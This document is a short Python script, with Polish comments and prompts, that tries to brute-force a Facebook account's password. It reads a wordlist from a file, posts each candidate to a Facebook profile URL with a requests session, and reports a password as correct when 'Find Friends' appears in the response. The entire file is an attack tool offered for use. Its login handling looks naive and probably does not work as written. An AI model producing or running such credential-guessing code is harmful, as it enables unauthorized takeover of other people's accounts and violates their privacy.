import requests

def brute_force(username, fb_id, passwords):
    url = f'https://www.facebook.com/{fb_id}'

    with requests.Session() as session:
        for password in passwords:
            data = {'email': username, 'pass': password}

            try:
                response = session.post(url, data=data)
                response.raise_for_status()  # Sprawdzanie błędów HTTP

                if 'Find Friends' in response.text:
                    print(f'Prawidłowe hasło znalezione: {password}')
                    break
                else:
                    print(f'Nieprawidłowe hasło: {password}')

            except requests.exceptions.RequestException as e:
                print(f'Błąd podczas żądania HTTP: {e}')

def main():
    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    password_file = input('Podaj nazwę pliku z hasłami: ')

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    brute_force(email, fb_id, passwords)

if __name__ == '__main__':
    main()
